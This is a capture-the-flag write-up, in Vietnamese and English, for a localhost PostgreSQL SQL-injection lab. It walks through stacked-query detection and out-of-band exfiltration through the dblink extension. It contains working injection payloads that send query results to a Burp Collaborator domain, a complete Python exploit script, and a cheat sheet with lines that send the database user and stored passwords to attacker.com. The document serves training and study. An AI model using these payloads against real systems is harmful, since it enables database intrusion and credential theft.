# SQLi-042: PostgreSQL OOB via dblink Extension - Writeup

## Flag: `FLAG{postgres_dblink_oob_exfil}`

---

## 🔍 Bước 1: DETECT

```bash
# Response luôn giống nhau
curl "http://localhost:5042/product?id=1"

# Test stacked queries
time curl "http://localhost:5042/product?id=1;SELECT pg_sleep(3)--"
# ~3s delay → Stacked queries work!
```

---

## 🎯 Bước 2: IDENTIFY

Frontend hints:
- PostgreSQL với dblink extension enabled
- Stacked Queries: ON

---

## 🔧 Bước 3: ENUMERATE với dblink

### Cách hoạt động của dblink OOB

`dblink` tạo connection đến external PostgreSQL server. Attacker có thể:
1. Nhận DNS lookup từ hostname
2. Hoặc nhận TCP connection trên port 5432
3. Data được embed trong connection string (user/password)

### Test OOB

**Payload:**
```sql
1;SELECT * FROM dblink('host=xxxxx.burpcollaborator.net user=test password=test dbname=test','SELECT 1') RETURNS (i int)--
```

**Collaborator:** DNS lookup received! ✅

### Extract data trong connection string

```sql
1;SELECT * FROM dblink('host=xxxxx.burpcollaborator.net user=a password='||(SELECT current_database())||' dbname=a','SELECT 1') RETURNS (i int)--
```

**Alternative: Data trong hostname**
```sql
1;SELECT * FROM dblink('host='||(SELECT current_database())||'.xxxxx.burpcollaborator.net user=a dbname=a','SELECT 1') RETURNS (i int)--
```

---

## 📤 Bước 4: EXTRACT

### Enumerate tables

```sql
1;SELECT * FROM dblink('host='||(SELECT table_name FROM information_schema.tables WHERE table_schema=''public'' LIMIT 1)||'.xxxxx.burpcollaborator.net user=a dbname=a','SELECT 1') RETURNS (i int)--
```

**Note:** Cần escape single quotes trong subquery với double quotes!

**Tables found:** admin_users, flags, products

### Extract flag

```sql
1;SELECT * FROM dblink('host='||(SELECT value FROM flags WHERE name=''sqli_042'')||'.xxxxx.burpcollaborator.net user=a dbname=a','SELECT 1') RETURNS (i int)--
```

---

## 🏆 Bước 5-6: EXFILTRATE

**Final Payload:**
```sql
1;SELECT * FROM dblink('host='||(SELECT value FROM flags LIMIT 1)||'.xxxxx.burpcollaborator.net user=a dbname=a','SELECT 1') RETURNS (i int)--
```

**URL Encoded:**
```
http://localhost:5042/product?id=1;SELECT%20*%20FROM%20dblink('host='||(SELECT%20value%20FROM%20flags%20LIMIT%201)||'.xxxxx.burpcollaborator.net%20user=a%20dbname=a','SELECT%201')%20RETURNS%20(i%20int)--
```

**DNS Lookup:**
```
FLAG{postgres_dblink_oob_exfil}.xxxxx.burpcollaborator.net
```

🎉 **FLAG:** `FLAG{postgres_dblink_oob_exfil}`

---

## 🤖 Automated Exploit

```python
#!/usr/bin/env python3
import requests
import argparse

def send_dblink_oob(url, query, oob_domain):
    # Data embedded in hostname
    payload = f"1;SELECT * FROM dblink('host='||({query})||'.{oob_domain} user=a dbname=a','SELECT 1') RETURNS (i int)--"
    try:
        requests.get(url, params={"id": payload}, timeout=10)
    except:
        pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:5042/product")
    parser.add_argument("--oob", required=True)
    args = parser.parse_args()
    
    print(f"[*] Target: {args.target}")
    print(f"[*] OOB: {args.oob}")
    
    print("\n[1] Extracting database...")
    send_dblink_oob(args.target, "SELECT current_database()", args.oob)
    
    print("[2] Extracting flag...")
    send_dblink_oob(args.target, "SELECT value FROM flags LIMIT 1", args.oob)
    
    print(f"\n[*] Check DNS: <data>.{args.oob}")
    print("[*] Expected: FLAG{postgres_dblink_oob_exfil}")

if __name__ == "__main__":
    main()
```

---

## 🔗 Key Techniques

```sql
-- dblink với data trong hostname (DNS exfil)
1;SELECT * FROM dblink('host='||(SELECT user)||'.attacker.com user=a dbname=a','SELECT 1') RETURNS (i int)--

-- dblink với data trong password (captured qua wireshark/tcpdump)
1;SELECT * FROM dblink('host=attacker.com user=a password='||(SELECT password FROM users LIMIT 1)||' dbname=a','SELECT 1') RETURNS (i int)--

-- dblink_connect (không cần RETURNS)
1;SELECT dblink_connect('host='||(SELECT current_database())||'.attacker.com user=a dbname=a')--
```

---

## 📊 Summary

| Step | Action | Result |
|------|--------|--------|
| DETECT | Test stacked queries | pg_sleep works |
| IDENTIFY | PostgreSQL với dblink | Extension available |
| ENUMERATE | OOB via dblink | Found flags table |
| EXFILTRATE | Extract flag via DNS | FLAG{postgres_dblink_oob_exfil} |

---

## ⚠️ Requirements

- dblink extension installed
- Stacked queries support
- Network egress cho DNS từ database server
